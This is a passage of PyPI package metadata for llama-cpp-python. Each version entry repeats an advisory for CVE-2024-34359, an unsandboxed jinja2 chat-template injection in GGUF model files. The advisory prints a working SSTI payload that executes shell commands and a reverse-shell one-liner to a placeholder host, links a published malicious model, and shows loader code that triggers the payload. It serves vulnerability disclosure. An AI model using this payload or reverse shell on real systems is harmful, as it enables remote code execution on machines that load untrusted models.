3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.33/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.33","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"d45ec544cd520169f55e6cad63d3b8dec9c4e47326b1cb4095a91dce942be1a7","md5":"28f505178dfb58b89a45a45ae19ba1c1","sha256":"166952f657b23baa4d5839e9eadb3ec7b29a82a7828b8529b895bee641f4e3ca"},"downloads":-1,"filename":"llama_cpp_python-0.2.33.tar.gz","has_sig":false,"md5_digest":"28f505178dfb58b89a45a45ae19ba1c1","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":9763185,"upload_time":"2024-01-25T16:32:52","upload_time_iso_8601":"2024-01-25T16:32:52.453883Z","url":"https://files.pythonhosted.org/packages/d4/5e/c544cd520169f55e6cad63d3b8dec9c4e47326b1cb4095a91dce942be1a7/llama_cpp_python-0.2.33.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.34":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.34/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.34","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"785fd46a72081d6e0e77e44abf092b11517267e4d290a3f20cf3b9a9faab7705","md5":"268fda3ee53b1f45dc4fd43e2fe25108","sha256":"eca98f3daf31a9551971b122eca64224f0525911620a472b7b382c158a7131d4"},"downloads":-1,"filename":"llama_cpp_python-0.2.34.tar.gz","has_sig":false,"md5_digest":"268fda3ee53b1f45dc4fd43e2fe25108","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":9769513,"upload_time":"2024-01-27T23:58:49","upload_time_iso_8601":"2024-01-27T23:58:49.114020Z","url":"https://files.pythonhosted.org/packages/78/5f/d46a72081d6e0e77e44abf092b11517267e4d290a3f20cf3b9a9faab7705/llama_cpp_python-0.2.34.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# Ignoring lines of unrelated codes.....\n\n        try:\n            self.metadata = self._model.metadata()\n        except Exception as e:\n            self.metadata = {}\n            if self.verbose:\n                print(f\"Failed to load metadata: {e}\", file=sys.stderr)\n\n        if self.verbose:\n            print(f\"Model metadata: {self.metadata}\", file=sys.stderr)\n\n        if (\n            self.chat_format is None\n            and self.chat_handler is None\n            and \"tokenizer.chat_template\" in self.metadata\n        ):\n            chat_format = llama_chat_format.guess_chat_format_from_gguf_metadata(\n                self.metadata\n            )\n\n            if chat_format is not None:\n                self.chat_format = chat_format\n                if self.verbose:\n                    print(f\"Guessed chat format: {chat_format}\", file=sys.stderr)\n            else:\n                template = self.metadata[\"tokenizer.chat_template\"]\n                try:\n                    eos_token_id = int(self.metadata[\"tokenizer.ggml.eos_token_id\"])\n                except:\n                    eos_token_id = self.token_eos()\n                try:\n                    bos_token_id = int(self.metadata[\"tokenizer.ggml.bos_token_id\"])\n                except:\n                    bos_token_id = self.token_bos()\n\n                eos_token = self._model.token_get_text(eos_token_id)\n                bos_token = self._model.token_get_text(bos_token_id)\n\n                if self.verbose:\n                    print(f\"Using gguf chat template: {template}\", file=sys.stderr)\n                    print(f\"Using chat eos_token: {eos_token}\", file=sys.stderr)\n                    print(f\"Using chat bos_token: {bos_token}\", file=sys.stderr)\n\n                self.chat_handler = llama_chat_format.Jinja2ChatFormatter(\n                    template=template,\n                    eos_token=eos_token,\n                    bos_token=bos_token,\n                    stop_token_ids=[eos_token_id],\n                ).to_chat_handler()\n\n        if self.chat_format is None and self.chat_handler is None:\n            self.chat_format = \"llama-2\"\n            if self.verbose:\n                print(f\"Using fallback chat format: {chat_format}\", file=sys.stderr)\n                \n```\n\nIn `llama.py`, `llama-cpp-python` defined the fundamental class for model initialization parsing (Including `NUMA, LoRa settings`, `loading tokenizers,` and stuff ). In our case, we will be focusing on the parts where it processes `metadata`; it first checks if `chat_format` and `chat_handler` are `None` and checks if the key `tokenizer.chat_template` exists in the metadata dictionary `self.metadata`. If it exists, it will try to guess the `chat format` from the `metadata`. If the guess fails, it will get the value of `chat_template` directly from `self.metadata.self.metadata` is set during class initialization and it tries to get the metadata by calling the model's metadata() method, after that, the `chat_template` is parsed into `llama_chat_format.Jinja2ChatFormatter` as params which furthermore stored the `to_chat_handler()` as `chat_handler`\n\n### `llama_chat_format.py` -> `Jinja2ChatFormatter`:\n\n`self._environment =  jinja2.Environment( -> from_string(self.template) -> self._environment.render(`\n\n```python\nclass ChatFormatter(Protocol):\n    \"\"\"Base Protocol for a chat formatter. A chat formatter is a function that\n    takes a list of messages and returns a chat format response which can be used\n    to generate a completion. The response can also include a stop token or list\n    of stop tokens to use for the completion.\"\"\"\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        **kwargs: Any,\n    ) -> ChatFormatterResponse: ...\n\n\nclass Jinja2ChatFormatter(ChatFormatter):\n    def __init__(\n        self,\n        template: str,\n        eos_token: str,\n        bos_token: str,\n        add_generation_prompt: bool = True,\n        stop_token_ids: Optional[List[int]] = None,\n    ):\n        \"\"\"A chat formatter that uses jinja2 templates to format the prompt.\"\"\"\n        self.template = template\n        self.eos_token = eos_token\n        self.bos_token = bos_token\n        self.add_generation_prompt = add_generation_prompt\n        self.stop_token_ids = set(stop_token_ids) if stop_token_ids is not None else None\n\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render(\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n\n```\n\nAs we can see in `llama_chat_format.py` -> `Jinja2ChatFormatter`, the constructor `__init__` initialized required `members` inside of the class; Nevertheless, focusing on this line:\n\n```python\n        self._environment = jinja2.Environment(\n            loader=jinja2.BaseLoader(),\n            trim_blocks=True,\n            lstrip_blocks=True,\n        ).from_string(self.template)\n```\n\nFun thing here: `llama_cpp_python` directly loads the `self.template` (`self.template = template` which is the `chat template` located in the `Metadate` that is parsed as a param) via `jinja2.Environment.from_string(` without setting any sandbox flag or using the protected `immutablesandboxedenvironment `class. This is extremely unsafe since the attacker can implicitly tell `llama_cpp_python` to load malicious `chat template` which is furthermore rendered in the `__call__` constructor, allowing RCEs or Denial-of-Service since `jinja2`'s renderer evaluates embed codes like `eval()`, and we can utilize expose method by exploring the attribution such as `__globals__`, `__subclasses__` of pretty much anything.\n\n```python\n    def __call__(\n        self,\n        *,\n        messages: List[llama_types.ChatCompletionRequestMessage],\n        functions: Optional[List[llama_types.ChatCompletionFunction]] = None,\n        function_call: Optional[llama_types.ChatCompletionRequestFunctionCall] = None,\n        tools: Optional[List[llama_types.ChatCompletionTool]] = None,\n        tool_choice: Optional[llama_types.ChatCompletionToolChoiceOption] = None,\n        **kwargs: Any,\n    ) -> ChatFormatterResponse:\n        def raise_exception(message: str):\n            raise ValueError(message)\n\n        prompt = self._environment.render( # rendered!\n            messages=messages,\n            eos_token=self.eos_token,\n            bos_token=self.bos_token,\n            raise_exception=raise_exception,\n            add_generation_prompt=self.add_generation_prompt,\n            functions=functions,\n            function_call=function_call,\n            tools=tools,\n            tool_choice=tool_choice,\n        )\n```\n\n## Exploiting\n\nFor our exploitation, we first downloaded [qwen1_5-0_5b-chat-q2_k.gguf](https://huggingface.co/Qwen/Qwen1.5-0.5B-Chat-GGUF/blob/main/qwen1_5-0_5b-chat-q2_k.gguf) of `Qwen/Qwen1.5-0.5B-Chat-GGUF` on `huggingface` as the base of the exploitation, by importing the file to `Hex-compatible` editors (In my case I used the built-in `Hex editor` or `vscode`), you can try to search for key `chat_template` (imported as `template = self.metadata[\"tokenizer.chat_template\"]` in `llama-cpp-python`):\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405021808647.png\" alt=\"image-20240502180804562\" style=\"zoom: 25%;\" />\n\n`qwen1_5-0_5b-chat-q2_k.gguf` appears to be using the OG `role+message` and using the fun `jinja2` syntax. By first replacing the original `chat_template` in `\\x00`, then inserting our SSTI payload. We constructed this payload which firstly iterates over the subclasses of the base class of all classes in Python. The expression `().__class__.__base__.__subclasses__()` retrieves a list of all subclasses of the basic `object` class and then we check if its `warning` by `if \"warning\" in x.__name__`, if it is , we access its module via the `_module` attribute then access Python's built-in functions through `__builtins__` and uses the `__import__` function to import the `os` module and finally we called `os.popen` to `touch /tmp/retr0reg`, create an empty file call `retr0reg` under `/tmp/`\n\n```python\n{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"touch /tmp/retr0reg\")}}{%endif%}{% endfor %}\n```\n\nin real life exploiting instance, we can change `touch /tmp/retr0reg` into arbitrary codes like `sh -i >& /dev/tcp/<HOST>/<PORT> 0>&1` to create a reverse shell connection to specified host, in our case we are using `touch /tmp/retr0reg` to showcase the exploitability of this vulnerability.\n\n<img src=\"https://raw.githubusercontent.com/retr0reg/0reg-uploads/main/img/202405022009159.png\" alt=\"image-20240502200909127\" style=\"zoom:50%;\" />\n\nAfter these steps, we got ourselves a malicious model with an embedded payload in `chat_template` of the `metahead`, in which will be parsed and rendered by `llama.py:class Llama:init ->  self.chat_handler `-> `llama_chat_format.py:Jinja2ChatFormatter:init ->  self._environment = jinja2.Environment(` -> ``llama_chat_format.py:Jinja2ChatFormatter:call -> self._environment.render(`\n\n*(The uploaded malicious model file is in https://huggingface.co/Retr0REG/Whats-up-gguf )*\n\n```python\nfrom llama_cpp import Llama\n\n# Loading locally:\nmodel = Llama(model_path=\"qwen1_5-0_5b-chat-q2_k.gguf\")\n# Or loading from huggingface:\nmodel = Llama.from_pretrained(\n    repo_id=\"Retr0REG/Whats-up-gguf\",\n    filename=\"qwen1_5-0_5b-chat-q2_k.gguf\",\n    verbose=False\n)\n\nprint(model.create_chat_completion(messages=[{\"role\": \"user\",\"content\": \"what is the meaning of life?\"}]))\n```\n\nNow when the model is loaded whether as ` Llama.from_pretrained` or `Llama` and chatted, our malicious code in the `chat_template` of the `metahead` will be triggered and execute arbitrary code. \n\nPoC video here: https://drive.google.com/file/d/1uLiU-uidESCs_4EqXDiyKR1eNOF1IUtb/view?usp=sharing\n","fixed_in":["0.2.72"],"id":"GHSA-56xg-wfcc-g829","link":"https://osv.dev/vulnerability/GHSA-56xg-wfcc-g829","source":"osv","summary":null,"withdrawn":null}]},"0.2.35":{"info":{"author":"","author_email":"Andrei Betlen <abetlen@gmail.com>","bugtrack_url":null,"classifiers":["Programming Language :: Python :: 3","Programming Language :: Python :: 3.10","Programming Language :: Python :: 3.11","Programming Language :: Python :: 3.12","Programming Language :: Python :: 3.8","Programming Language :: Python :: 3.9"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"","keywords":"","license":"MIT","maintainer":"","maintainer_email":"","name":"llama-cpp-python","package_url":"https://pypi.org/project/llama-cpp-python/","platform":null,"project_url":"https://pypi.org/project/llama-cpp-python/","project_urls":{"Changelog":"https://llama-cpp-python.readthedocs.io/en/latest/changelog/","Documentation":"https://llama-cpp-python.readthedocs.io/en/latest/","Homepage":"https://github.com/abetlen/llama-cpp-python","Issues":"https://github.com/abetlen/llama-cpp-python/issues"},"provides_extra":null,"release_url":"https://pypi.org/project/llama-cpp-python/0.2.35/","requires_dist":["typing-extensions>=4.5.0","numpy>=1.20.0","diskcache>=5.6.1","jinja2>=2.11.3","uvicorn>=0.22.0; extra == \"server\"","fastapi>=0.100.0; extra == \"server\"","pydantic-settings>=2.0.1; extra == \"server\"","sse-starlette>=1.6.1; extra == \"server\"","starlette-context<0.4,>=0.3.6; extra == \"server\"","pytest>=7.4.0; extra == \"test\"","httpx>=0.24.1; extra == \"test\"","scipy>=1.10; extra == \"test\"","black>=23.3.0; extra == \"dev\"","twine>=4.0.2; extra == \"dev\"","mkdocs>=1.4.3; extra == \"dev\"","mkdocstrings[python]>=0.22.0; extra == \"dev\"","mkdocs-material>=9.1.18; extra == \"dev\"","pytest>=7.4.0; extra == \"dev\"","httpx>=0.24.1; extra == \"dev\"","llama_cpp_python[dev,server,test]; extra == \"all\""],"requires_python":">=3.8","summary":"Python bindings for the llama.cpp library","version":"0.2.35","yanked":false,"yanked_reason":null},"last_serial":25247474,"urls":[{"comment_text":"","digests":{"blake2b_256":"453ec5eb7a5a2689c15657beb08d0c6915cc61a9a20311ff00a567fc7a70a530","md5":"820b28847e4175f88bc3b36bec329ba9","sha256":"7077c37d15a1ca6ae7fa332bfaaaf8870289f0e6d16fd223a5afc864f1860bb4"},"downloads":-1,"filename":"llama_cpp_python-0.2.35.tar.gz","has_sig":false,"md5_digest":"820b28847e4175f88bc3b36bec329ba9","packagetype":"sdist","python_version":"source","requires_python":">=3.8","size":10681659,"upload_time":"2024-01-29T00:37:22","upload_time_iso_8601":"2024-01-29T00:37:22.519534Z","url":"https://files.pythonhosted.org/packages/45/3e/c5eb7a5a2689c15657beb08d0c6915cc61a9a20311ff00a567fc7a70a530/llama_cpp_python-0.2.35.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2024-34359"],"details":"## Description\n\n`llama-cpp-python` depends on class `Llama` in `llama.py` to load `.gguf` llama.cpp or Latency Machine Learning Models. The `__init__` constructor built in the `Llama` takes several parameters to configure the loading and running of the model. Other than `NUMA, LoRa settings`, `loading tokenizers,` and `hardware settings`, `__init__` also loads the `chat template` from targeted `.gguf` 's Metadata and furtherly parses it to `llama_chat_format.Jinja2ChatFormatter.to_chat_handler()` to construct the `self.chat_handler` for this model. Nevertheless, `Jinja2ChatFormatter` parse the `chat template` within the Metadate with sandbox-less `jinja2.Environment`, which is furthermore rendered in `__call__` to construct the `prompt` of interaction. This allows `jinja2` Server Side Template Injection which leads to RCE by a carefully constructed payload.\n\n## Source-to-Sink\n\n### `llama.py` -> `class Llama` -> `__init__`:\n\n```python\nclass Llama:\n    \"\"\"High-level Python wrapper for a llama.cpp model.\"\"\"\n\n    __backend_initialized = False\n\n    def __init__(\n        self,\n        model_path: str,\n\t\t# lots of params; Ignoring\n    ):\n \n        self.verbose = verbose\n\n        set_verbose(verbose)\n\n        if not Llama.__backend_initialized:\n            with suppress_stdout_stderr(disable=verbose):\n                llama_cpp.llama_backend_init()\n            Llama.__backend_initialized = True\n\n\t\t# 